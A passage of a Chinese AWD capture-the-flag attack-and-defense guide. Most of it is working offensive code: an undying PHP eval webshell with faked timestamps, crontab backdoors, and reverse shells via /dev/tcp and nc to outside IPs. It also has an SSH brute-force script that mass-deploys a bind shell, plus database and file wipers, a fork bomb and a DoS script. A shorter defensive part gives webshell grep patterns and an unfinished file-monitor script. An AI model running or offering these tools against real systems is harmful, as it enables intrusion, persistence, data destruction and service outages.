+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">'.login.php'</span><span class="p">;</span>
+<span class="nv">$file1</span> <span class="o">=</span> <span class="s1">'/admin/.register.php'</span><span class="p">;</span> 
+<span class="nv">$code</span> <span class="o">=</span> <span class="s1">'&lt;?php if(md5($_GET["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST["at"]);} ?&gt;'</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s1">'touch -m -d "2018-12-01 09:10:12" .login.php'</span><span class="p">);</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file1</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s1">'touch -m -d "2018-12-01 09:10:12" /admin/.register.php'</span><span class="p">);</span>
+    <span class="nb">usleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>浏览器访问at.php，会生成不死马at2.php</p>
+<div class="highlight"><pre><span></span><span class="x">url/upload/at.php</span>
+</pre></div>
+<p>再传入，执行命令，getshell</p>
+<div class="highlight"><pre><span></span><span class="x">url/upload/at2.php?passwd=obse007&amp;at=system('ls');</span>
+</pre></div>
+<h2 id="toc-10">权限维持</h2>
+<p>预留后门的权限维持特别重要，不要急着拿flag，往后每一轮预留后门都会减少，未雨绸缪。<br>
+<strong>crontab定时任务</strong><br>
+1.使用定时任务写马</p>
+<div class="highlight"><pre><span></span>system<span class="o">(</span><span class="s1">'echo "* * * * * echo \"&lt;?php  if(md5(\\\\\\\\\$_POST[pass])==\'</span>462d4a0e7cedd6b024a4d99f10c614d1<span class="se">\'</span><span class="o">){</span>@eval<span class="o">(</span><span class="se">\\\\\\\\\$</span>_POST<span class="o">[</span><span class="m">1</span><span class="o">])</span><span class="p">;</span><span class="o">}</span>  <span class="se">\"</span> &gt; /var/www/html/.index.php<span class="se">\n</span>* * * * * chmod <span class="m">777</span> /var/www/html/.index.php<span class="s2">" | crontab;whoami');</span>
+</pre></div>
+<p>密码：atkx<br>
+来指定用户运行指定的定时任务</p>
+<p>2.使用定时任务发送带有flag的请求</p>
+<div class="highlight"><pre><span></span>bash# 编辑 crontab：crontab -e
+*/5 * * * * curl <span class="m">10</span>.10.10.5:8000/submit_flag/ -d <span class="s1">'flag='</span><span class="k">$(</span>cat /home/web/flag/flag<span class="k">)</span><span class="s1">'&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY'</span>
+<span class="c1"># 查询 crontab：crontab -l</span>
+</pre></div>
+<p>3.使用定时任务反弹shell</p>
+<div class="highlight"><pre><span></span>bash -c bash<span class="s1">'bash -i &gt;&amp; /dev/tcp/[ip]/[port] 0&gt;&amp;1'</span>
+
+nc -e /bin/bash <span class="m">1</span>.3.3.7 <span class="m">4444</span> bash
+</pre></div>
+<p><strong>反弹shell</strong><br>
+nc反弹shell</p>
+<div class="highlight"><pre><span></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/192.168.182.130/6666 <span class="m">0</span>&gt;<span class="p">&amp;</span><span class="m">1</span>
+</pre></div>
+<p>本地</p>
+<div class="highlight"><pre><span></span>nc -l -p <span class="m">6666</span>
+</pre></div>
+<h2 id="toc-11">软链接</h2>
+<p>软连接语法：</p>
+
+<pre><code>ln -s  [shell路径]   [新文件路径]</code></pre>
+<p>使用方法：<br>
+访问/upload/new.php，实际上是访问/upload/shell.php</p>
+
+<pre><code>ln -s  /var/www/html/upload/shell.php     /var/www/html/upload/new.php</code></pre>
+<p>软连接利用</p>
+<div class="highlight"><pre><span></span>root@086f12c38b93:~# ln -s /flag /var/www/html/css/flag.css
+root@086f12c38b93:~# cat /var/www/html/css/flag.css
+SL<span class="o">{</span>3c7c719b9fb980dca71080b9d96c9c6aa03c16c0<span class="o">}</span>
+</pre></div>
+<p>然后访问url/css/flag.css即可得到flag</p>
+<h2 id="toc-12">SSH弱密码利用</h2>
+<div class="highlight"><pre><span></span><span class="c1">#-*- coding:utf-8 -*-</span>
+import paramiko
+<span class="nv">ip</span> <span class="o">=</span> <span class="s1">'192.168.1.137'</span>
+<span class="nv">port</span> <span class="o">=</span> <span class="s1">'22'</span>
+<span class="nv">username</span> <span class="o">=</span> <span class="s1">'root'</span>
+<span class="nv">passwd</span> <span class="o">=</span> <span class="s1">'123456'</span>
+<span class="c1"># ssh 用户名 密码 登陆</span>
+def ssh_base_pwd<span class="o">(</span>ip,port,username,passwd,cmd<span class="o">=</span><span class="s1">'cat /flag'</span><span class="o">)</span>:
+    <span class="nv">port</span> <span class="o">=</span> int<span class="o">(</span>port<span class="o">)</span>
+    <span class="nv">ssh</span> <span class="o">=</span> paramiko.SSHClient<span class="o">()</span>
+    ssh.set_missing_host_key_policy<span class="o">(</span>paramiko.AutoAddPolicy<span class="o">())</span>
+    ssh.connect<span class="o">(</span><span class="nv">hostname</span><span class="o">=</span>ip, <span class="nv">port</span><span class="o">=</span>port, <span class="nv">username</span><span class="o">=</span>username, <span class="nv">password</span><span class="o">=</span>passwd<span class="o">)</span>
+    stdin,stdout,stderr <span class="o">=</span> ssh.exec_command<span class="o">(</span>cmd<span class="o">)</span>
+    <span class="nv">result</span> <span class="o">=</span> stdout.read<span class="o">()</span>
+    <span class="k">if</span> not result :
+        print<span class="o">(</span><span class="s2">"无结果!"</span><span class="o">)</span>
+        <span class="nv">result</span> <span class="o">=</span> stderr.read<span class="o">()</span>
+    ssh.close<span class="o">()</span>
+    <span class="k">return</span> result.decode<span class="o">()</span>
+<span class="nv">a</span> <span class="o">=</span> ssh_base_pwd<span class="o">(</span>ip,port,username,passwd<span class="o">)</span>
+print<span class="o">(</span>a<span class="o">)</span>
+
+<span class="c1">#SL{3c7c719b9fb980dca71080b9d96c9c6aa03c16c0}</span>
+</pre></div>
+<p>批量</p>
+<div class="highlight"><pre><span></span><span class="c1">#-*- coding:utf-8 -*-</span>
+import paramiko
+import threading
+import queue
+import <span class="nb">time</span>
+<span class="c1">#反弹shell python</span>
+<span class="nv">q</span><span class="o">=</span>queue.Queue<span class="o">()</span>
+<span class="c1">#lock = threading.Lock()</span>
+
+<span class="c1"># ssh 用户名 密码 登陆</span>
+def ssh_base_pwd<span class="o">(</span>ip,port,username,passwd,cmd<span class="o">)</span>:
+    <span class="nv">port</span> <span class="o">=</span> int<span class="o">(</span>port<span class="o">)</span>
+    <span class="nv">ssh</span> <span class="o">=</span> paramiko.SSHClient<span class="o">()</span>
+    ssh.set_missing_host_key_policy<span class="o">(</span>paramiko.AutoAddPolicy<span class="o">())</span>
+    ssh.connect<span class="o">(</span><span class="nv">hostname</span><span class="o">=</span>ip, <span class="nv">port</span><span class="o">=</span>port, <span class="nv">username</span><span class="o">=</span>username, <span class="nv">password</span><span class="o">=</span>passwd<span class="o">)</span>
+    stdin,stdout,stderr <span class="o">=</span> ssh.exec_command<span class="o">(</span>cmd<span class="o">)</span>
+    <span class="nv">result</span> <span class="o">=</span> stdout.read<span class="o">()</span>
+    <span class="k">if</span> not result :
+        <span class="nv">result</span> <span class="o">=</span> stderr.read<span class="o">()</span>
+    ssh.close<span class="o">()</span>
+    <span class="k">return</span> result.decode<span class="o">()</span>
+
+def main<span class="o">(</span>x<span class="o">)</span>:
+    <span class="nv">shell</span> <span class="o">=</span> <span class="s1">'''</span>
+<span class="s1">    #服务器端</span>
+<span class="s1">    import socket</span>
+<span class="s1">    import os</span>
+<span class="s1">    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span>
+<span class="s1">    s.bind(('</span><span class="m">0</span>.0.0.0<span class="s1">',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接</span>
+<span class="s1">    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量</span>
+<span class="s1">    con,addr=s.accept()     #接受一个客户端的连接</span>
+<span class="s1">    #print(con,addr)</span>
+<span class="s1">    for i in range(10):</span>
+<span class="s1">        cmd=con.recv(1024)</span>
+<span class="s1">        print(cmd)</span>
+<span class="s1">        command=cmd.decode()</span>
+<span class="s1">        if command.startswith('</span>cd<span class="s1">'):</span>
+<span class="s1">            os.chdir(command[2:].strip())   #切换路径</span>
+<span class="s1">            result=os.getcwd()      #显示路径</span>
+<span class="s1">        else:</span>
+<span class="s1">            result=os.popen(command).read()</span>
+<span class="s1">        if result:</span>
+<span class="s1">            con.send(result.encode())</span>
+<span class="s1">        else:</span>
+<span class="s1">            con.send(b'</span>OK!<span class="s1">')</span>
+<span class="s1">    '''</span>
+    <span class="nv">cmd</span> <span class="o">=</span> <span class="s1">'echo \"%s\" &gt; ./shell.py'</span> % <span class="o">(</span>shell<span class="o">)</span> +<span class="s1">'&amp;&amp; python3 ./shell.py'</span>
+    <span class="nv">port</span> <span class="o">=</span> <span class="s1">'22'</span>
+    <span class="nv">username</span> <span class="o">=</span> <span class="s1">'root'</span>
+    <span class="nv">passwd</span> <span class="o">=</span> <span class="s1">'toor'</span>
+
+    <span class="nv">ip</span> <span class="o">=</span> <span class="s1">'192.168.1.{}'</span>.format<span class="o">(</span>x<span class="o">)</span>
+    q.put<span class="o">(</span>ip.strip<span class="o">()</span>,block<span class="o">=</span>True, <span class="nv">timeout</span><span class="o">=</span>None<span class="o">)</span>
+    <span class="nv">ip_demo</span><span class="o">=</span>q.get<span class="o">()</span>
+    <span class="c1">#判断是否成功</span>
+    try:
+        <span class="c1">#lock.acquire()</span>
+        <span class="nv">res</span> <span class="o">=</span> ssh_base_pwd<span class="o">(</span>ip_demo,port,username,passwd,cmd<span class="o">=</span><span class="s1">'id'</span><span class="o">)</span>
+        <span class="k">if</span> res:
+            print<span class="o">(</span><span class="s2">"[ + ]Ip: %s"</span> % ip_demo +<span class="s2">" is success!!! [ + ]"</span><span class="o">)</span>
+            <span class="c1">#lock.release()</span>
+            ssh_base_pwd<span class="o">(</span>ip_demo,port,username,passwd,cmd<span class="o">)</span>
+    except:
+        print<span class="o">(</span><span class="s2">"[ - ]Ip: %s"</span> % ip_demo +<span class="s2">" is Failed"</span><span class="o">)</span>
+    <span class="k">if</span> x &gt; <span class="m">255</span>:
+        print<span class="o">(</span><span class="s2">"Finshed!!!!!!!!"</span><span class="o">)</span>
+    q.task_done<span class="o">()</span>
+
+<span class="c1">#线程队列部分</span>
+<span class="nv">th</span><span class="o">=[]</span>
+<span class="nv">th_num</span><span class="o">=</span><span class="m">255</span>
+<span class="k">for</span> x in range<span class="o">(</span>th_num<span class="o">)</span>:
+        <span class="nv">t</span><span class="o">=</span>threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>main,args<span class="o">=(</span>x,<span class="o">))</span>
+        th.append<span class="o">(</span>t<span class="o">)</span>
+<span class="k">for</span> x in range<span class="o">(</span>th_num<span class="o">)</span>:
+        th<span class="o">[</span>x<span class="o">]</span>.start<span class="o">()</span>
+<span class="k">for</span> x in range<span class="o">(</span>th_num<span class="o">)</span>:
+        th<span class="o">[</span>x<span class="o">]</span>.join<span class="o">()</span>
+
+<span class="c1">#q.join()所有任务完成</span>
+</pre></div>
+<h2 id="toc-13"> </h2>
+<h2 id="toc-14">攻击搅屎</h2>
+<p>无限复制</p>
+<div class="highlight"><pre><span></span>&lt;?php
+  set_time_limit<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
+  ignore_user_abort<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="p">;</span>
+  <span class="k">while</span><span class="o">(</span><span class="m">1</span><span class="o">){</span>
+      file_put_contents<span class="o">(</span>randstr<span class="o">()</span>.<span class="s1">'.php'</span>,file_get_content<span class="o">(</span>__FILE__<span class="o">))</span><span class="p">;</span>
+      file_get_contents<span class="o">(</span><span class="s2">"http://127.0.0.1/"</span><span class="o">)</span><span class="p">;</span>
+  <span class="o">}</span>
+?&gt;
+</pre></div>
+<p>修改数据库密码</p>
+<div class="highlight"><pre><span></span>update mysql.user <span class="nb">set</span> <span class="nv">authentication_string</span><span class="o">=</span>PASSWORD<span class="o">(</span><span class="s1">'p4rr0t'</span><span class="o">)</span><span class="p">;</span><span class="c1"># 修改所有用户密码</span>
+flush privileges<span class="p">;</span>
+UPDATE mysql.user SET <span class="nv">User</span><span class="o">=</span><span class="s1">'aaaaaaaaaaaa'</span> WHERE <span class="nv">user</span><span class="o">=</span><span class="s1">'root'</span><span class="p">;</span> 
+flush privileges<span class="p">;</span>
+delete from mysql.user <span class="p">;</span><span class="c1">#删除所有用户</span>
+flush privileges<span class="p">;</span>
+</pre></div>
+<p>重启 apache2 和 nigix</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env sh</span>
+<span class="k">while</span> <span class="o">[[</span> <span class="m">1</span> <span class="o">]]</span>
+<span class="k">do</span>
+    service apache2 stop
+    service nginx stop
+<span class="k">done</span> <span class="p">&amp;</span>
+</pre></div>
+<p>循环删除</p>
+<div class="highlight"><pre><span></span>&lt;?php
+    set_time_limit<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
+    ignore_user_abort<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
+    unlink<span class="o">(</span>__FILE__<span class="o">)</span><span class="p">;</span>
+    <span class="k">function</span> getfiles<span class="o">(</span><span class="nv">$path</span><span class="o">){</span>
+        foreach<span class="o">(</span>glob<span class="o">(</span><span class="nv">$path</span><span class="o">)</span> as <span class="nv">$afile</span><span class="o">){</span>
+            <span class="k">if</span><span class="o">(</span>is_dir<span class="o">(</span><span class="nv">$afile</span><span class="o">))</span>
+                getfiles<span class="o">(</span><span class="nv">$afile</span>.<span class="s1">'/*.php'</span><span class="o">)</span><span class="p">;</span>
+            <span class="k">else</span>
+                @file_put_contents<span class="o">(</span><span class="nv">$afile</span>,<span class="s2">"#Anything#"</span><span class="o">)</span><span class="p">;</span>
+                //unlink<span class="o">(</span><span class="nv">$afile</span><span class="o">)</span><span class="p">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="k">while</span><span class="o">(</span><span class="m">1</span><span class="o">){</span>
+        getfiles<span class="o">(</span>__DIR__<span class="o">)</span><span class="p">;</span>
+        sleep<span class="o">(</span><span class="m">10</span><span class="o">)</span><span class="p">;</span>
+    <span class="o">}</span>
+?&gt;
+
+&lt;?php
+    set_time_limit<span class="o">(</span><span class="m">0</span><span class="o">)</span><span class="p">;</span>
+    ignore_user_abort<span class="o">(</span><span class="m">1</span><span class="o">)</span><span class="p">;</span>
+    array_map<span class="o">(</span><span class="s1">'unlink'</span>, glob<span class="o">(</span><span class="s2">"some/dir/*.php"</span><span class="o">))</span><span class="p">;</span>
+?&gt;
+</pre></div>
+<p>删除数据库</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python3</span>
+  import base64
+  def rm_db<span class="o">(</span>db_user,my_db_passwd<span class="o">)</span>:
+      <span class="nv">cmd</span> <span class="o">=</span> <span class="s2">"/usr/bin/mysql -h localhost -u%s %s -e '"</span>%<span class="o">(</span>db_user,my_db_passwd<span class="o">)</span>
+      <span class="nv">db_name</span> <span class="o">=</span> <span class="o">[</span><span class="s1">'performance_schema'</span>,<span class="s1">'mysql'</span>,<span class="s1">'flag'</span><span class="o">]</span>
+      <span class="k">for</span> db in db_name:
+          <span class="nv">cmd</span> <span class="o">+=</span> <span class="s2">"drop database %s;"</span>%db
+      <span class="nv">cmd</span> <span class="o">+=</span> <span class="s2">"'"</span>
+      <span class="k">return</span> cmd
+</pre></div>
+<p>fork_bomb</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/bin/sh</span>
+/bin/echo <span class="s1">'.() { .|.&amp; } &amp;&amp; .'</span> &gt; /tmp/aaa<span class="p">;</span>/bin/bash /tmp/aaa<span class="p">;</span>
+</pre></div>
+<p>DOS脚本（非必要最好不要用）</p>
+<div class="highlight"><pre><span></span>import socket
+import <span class="nb">time</span>
+import threading
+
+<span class="nv">max</span><span class="o">=</span><span class="m">90000000</span>
+<span class="nv">port</span><span class="o">=</span><span class="m">80</span>                 <span class="c1">#端口</span>
+<span class="nv">host</span><span class="o">=</span><span class="s2">"192.168.92.154"</span>   <span class="c1">#IP</span>
+<span class="nv">page</span><span class="o">=</span><span class="s2">"/index.php"</span>
+
+<span class="nv">bag</span><span class="o">=(</span><span class="s2">"POST %s HTTP/1.1\r\n"</span>
+    <span class="s2">"host: %s\r\n"</span>
+    <span class="s2">"Content-Length: 1000000000\r\n"</span>
+    <span class="s2">"Cookie: 1998\r\n"</span>
+    <span class="s2">"\r\n"</span> % <span class="o">(</span>page,host<span class="o">))</span>
+
+<span class="nv">socks</span> <span class="o">=</span> <span class="o">[]</span>
+
+def connect<span class="o">()</span>:
+    global socks
+    <span class="k">for</span> i in range<span class="o">(</span><span class="m">0</span>,max<span class="o">)</span>:
+        <span class="nv">s</span> <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET,socket.SOCK_STREAM<span class="o">)</span>
+        try:
+            s.connect<span class="o">((</span>host,port<span class="o">))</span>
+            s.send<span class="o">(</span>bag.encode<span class="o">(</span><span class="s2">"utf-8"</span><span class="o">))</span>
+            socks.append<span class="o">(</span>s<span class="o">)</span>
+        except Exception as ex:
+            time.sleep<span class="o">(</span><span class="m">1</span><span class="o">)</span>
+
+def send<span class="o">()</span>:
+    global socks
+    <span class="k">while</span> True:
+        <span class="k">for</span> s in socks:
+            try:
+                print<span class="o">(</span><span class="s2">"攻击中...."</span><span class="o">)</span>
+            except Exception as ex:
+                socks.remove<span class="o">(</span>s<span class="o">)</span>
+                s.close<span class="o">()</span>
+        time.sleep<span class="o">(</span><span class="m">0</span>.1<span class="o">)</span>
+
+<span class="nv">One</span> <span class="o">=</span> threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>connect,args<span class="o">=())</span>
+<span class="nv">Two</span> <span class="o">=</span> threading.Thread<span class="o">(</span><span class="nv">target</span><span class="o">=</span>send,args<span class="o">=())</span>
+One.start<span class="o">()</span>
+Two.start<span class="o">()</span>
+</pre></div>
+<h1>防守思路</h1>
+<h2 id="toc-15">基础查杀</h2>
+<p>寻找最近20分钟修改过的文件</p>
+<div class="highlight"><pre><span></span>find /var/www/html -name *.php -mmin -20
+</pre></div>
+<p>寻找行数最短的文件：</p>
+<div class="highlight"><pre><span></span>find ./ -name <span class="s1">'*.php'</span> <span class="p">|</span> xargs wc -l <span class="p">|</span> sort -u
+</pre></div>
+<p>关键字查杀</p>
+<div class="highlight"><pre><span></span>find . -name <span class="s1">'*.php'</span> <span class="p">|</span> xargs grep -n <span class="s1">'eval('</span>
+find . -name <span class="s1">'*.php'</span> <span class="p">|</span> xargs grep -n <span class="s1">'assert'</span>
+find . -name <span class="s1">'*.php'</span> <span class="p">|</span> xargs grep -n <span class="s1">'system()'</span>
+</pre></div>
+<p>查找命令执行函数</p>
+<div class="highlight"><pre><span></span>find /var/www/html -name <span class="s2">"*.php"</span> <span class="p">|</span>xargs egrep <span class="s1">'assert|eval|phpinfo\(\)|\(base64_decoolcode|shell_exec|passthru|file_put_contents\(\.\*\$|base64_decode\('</span>
+</pre></div>
+<h2 id="toc-16">文件监控</h2>
+<p>脚本</p>
+<div class="highlight"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="c1">#use: python file_check.py ./</span>
+
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">hashlib</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">ntpath</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">CWD</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()</span>
+<span class="n">FILE_MD5_DICT</span> <span class="o">=</span> <span class="p">{}</span>      <span class="c1"># 文件MD5字典</span>
+<span class="n">ORIGIN_FILE_LIST</span> <span class="o">=</span> <span class="p">[]</span>
+
+<span class="c1"># 特殊文件路径字符串</span>
+<span class="n">Special_path_str</span> <span class="o">=</span> <span class="s1">'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'</span>
+<span class="n">bakstring</span> <span class="o">=</span> <span class="s1">'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'</span>
+<span class="n">logstring</span> <span class="o">=</span> <span class="s1">'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span>
+<span class="n">webshellstring</span> <span class="o">=</span> <span class="s1">'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'</span>
+<span class="n">difffile</span> <span class="o">=</span> <span class="s1">'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'</span>
+
+<span class="n">Special_string</span> <span class="o">=</span> <span class="s1">'drops_log'</span>  <span class="c1"># 免死金牌</span>
+<span class="n">UNICODE_ENCODING</span> <span class="o">=</span> <span class="s2">"utf-8"</span>
+<span class="n">INVALID_UNICODE_CHAR_FORMAT</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">"\?</span><span class="si">%02x</span><span class="s2">"</span>
+
+<span class="c1"># 文件路径字典</span>
+<span class="n">spec_base_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">CWD</span><span class="p">,</span> <span class="n">Special_path_str</span><span class="p">))</span>
+<span class="n">Special_path</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">'bak'</span> <span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">spec_base_path</span><span class="p">,</span> <span class="n">bakstring</span><span class="p">)),</span>
+    <span class="s1">'log'</span> <span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">spec_base_path</span><span class="p">,</span> <span class="n">logstring</span><span class="p">)),</span>
+    <span class="s1">'webshell'</span> <span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">spec_base_path</span><span class="p">,</span> <span class="n">webshellstring</span><span class="p">)),</span>
+    <span class="s1">'difffile'</span> <span class="p">:</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">realpath</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">spec_base_path</span><span class="p">,</span> <span class="n">difffile</span><span class="p">)),</span>
+<span class="p">}</span>
+
+<span class="k">def</span> <span class="nf">isListLike</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="p">(</span><span class="nb">list</span><span class="p">,</span> <span class="nb">tuple</span><span class="p">,</span> <span class="nb">set</span><span class="p">))</span>
+
+<span class="c1"># 获取Unicode编码</span>
+<span class="k">def</span> <span class="nf">getUnicode</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="bp">None</span><span class="p">,</span> <span class="n">noneToNull</span><span class="o">=</span><span class="bp">False</span><span class="p">):</span>
+
+    <span class="k">if</span> <span class="n">noneToNull</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+        <span class="k">return</span> <span class="n">NULL</span>
+
+    <span class="k">if</span> <span class="n">isListLike</span><span class="p">(</span><span class="n">value</span><span class="p">):</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">getUnicode</span><span class="p">(</span><span class="n">_</span><span class="p">,</span> <span class="n">encoding</span><span class="p">,</span> <span class="n">noneToNull</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">value</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">value</span>
+
+    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">unicode</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">value</span>
+    <span class="k">elif</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">basestring</span><span class="p">):</span>
+        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+            <span class="k">try</span><span class="p">:</span>
+                <span class="k">return</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">encoding</span> <span class="ow">or</span> <span class="n">UNICODE_ENCODING</span><span class="p">)</span>
+            <span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">,</span> <span class="n">ex</span><span class="p">:</span>
+                <span class="k">try</span><span class="p">:</span>
+                    <span class="k">return</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">UNICODE_ENCODING</span><span class="p">)</span>
+                <span class="k">except</span><span class="p">:</span>
+                    <span class="n">value</span> <span class="o">=</span> <span class="n">value</span><span class="p">[:</span><span class="n">ex</span><span class="o">.</span><span class="n">start</span><span class="p">]</span> <span class="o">+</span> <span class="s2">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">INVALID_UNICODE_CHAR_FORMAT</span> <span class="o">%</span> <span class="nb">ord</span><span class="p">(</span><span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">value</span><span class="p">[</span><span class="n">ex</span><span class="o">.</span><span class="n">start</span><span class="p">:</span><span class="n">ex</span><span class="o">.</span><span class="n">end</span><span class="p">])</span> <span class="o">+</span> <span class="n">value</span><span class="p">[</span><span class="n">ex</span><span class="o">.</span><span class="n">end</span><span class="p">:]</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">unicode</span><span class="p">(</span><span class="n">value</span><span class="p">)</span>
+        <span class="k">except</span> <span class="ne">UnicodeDecodeError</span><span class="p">:</span>
+            <span class="k">return</span> <span class="nb">unicode</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">value</span><span class="p">),</span> <span class="n">errors</span><span class="o">=</span><span class="s2">"ignore"</span><span class="p">)</span>
+
+<span class="c1"># 目录创建</span>
+<span class="k">def</span> <span class="nf">mkdir_p</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+    <span class="kn">import</span> <span class="nn">errno</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">os</span><span class="o">.</span><span class="n">makedirs</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
+    <span class="k">except</span> <span class="ne">OSError</span> <span class="k">as</span> <span class="n">exc</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">exc</span><span class="o">.</span><span class="n">errno</span> <span class="o">==</span> <span class="n">errno</span><span class="o">.</span><span class="n">EEXIST</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isdir</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+            <span class="k">pass</span>
+        <span class="k">else</span><span class="p">:</span> <span class="k">raise</span>
+
+<span class="c1"># 获取当前所有文件路径</span>
+<span class="k">def</span> <span class="nf">getfilelist</span><span class="p">(</span><span class="n">cwd</span><span class="p">):</span>
+    <span class="n">filelist</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">root</span><span class="p">,</span><span class="n">subdirs</span><span class="p">,</span> <span class="n">files</span> <span class="ow">in</span> <span class="n">os</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">cwd</span><span class="p">):</span>
+        <span class="k">for</span> <span class="n">filepath</span> <span class="ow">in</span> <span class="n">files</span><span class="p">:</span>
+            <span class="n">originalfile</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">filepath</span><span class="p">)</span>
+            <span class="k">if</span> <span class="n">Special_path_str</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">originalfile</span><span class="p">:</span>
+                <span class="n">filelist</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">originalfile</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">filelist</span>
+
+<span class="c1"># 计算机文件MD5值</span>
+<span class="k">def</span> <span class="nf">calcMD5</span><span class="p">(</span><span class="n">filepath</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filepath</span><span class="p">,</span><span class="s1">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
